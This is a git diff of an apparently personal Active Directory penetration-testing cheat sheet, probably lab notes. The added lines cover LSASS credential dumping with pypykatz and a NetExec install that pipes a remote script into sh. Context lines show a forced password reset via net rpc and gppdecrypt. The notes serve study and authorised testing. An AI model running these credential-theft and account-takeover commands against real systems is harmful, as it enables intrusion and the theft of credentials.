@@ -62,7 +62,7 @@ Get-ObjectAcl -DistinguishedName "DC=htb,DC=local" -ResolveGUIDs | Where-Object 
 ```
 
 [SYSVOL Group Policy Credential Mining](https://adsecurity.org/?p=2288)
-```gppdecrypt```
+gppdecrypt
 
 [Kerberoasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast)
 
@@ -81,9 +81,32 @@ Get-ObjectAcl -DistinguishedName "DC=htb,DC=local" -ResolveGUIDs | Where-Object 
 net rpc password AUDIT2020 -U BLACKFIELD\\support -S BLACKFIELD.local (prompts new password)
 ```
 
+## Credential Dumping
+[LSASS Dump - lsass.DMP](https://medium.com/@markmotig/some-ways-to-dump-lsass-exe-c4a75fdc49bf)
+
+**Requires:** Credential Guard to be disabled.
+
+```
+Dumping LSASS via Linux: https://medium.com/@offsecdeer/dumping-lsass-remotely-from-linux-efc47391e56d
+```
+
+[Pypykatz - Mimikatz for Linux](https://github.com/skelsec/pypykatz)
+
+**Requires:** A DMP file containing credentials extracted to our Linux machine.
+```
+pypykatz lsa minidump lsass.DMP
+```
+
 -----------------------------------------------------------------------
 
 ## Active Directory Tools
+[NetExec](https://github.com/Pennyw0rth/NetExec)
+```
+curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh (install Rust)
+source $HOME/.cargo/env
+pipx install git+https://github.com/Pennyw0rth/NetExec
+```
+
 [PowerView (Deprecated since 2021)](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)
 ```. .\powerview.ps1```
 
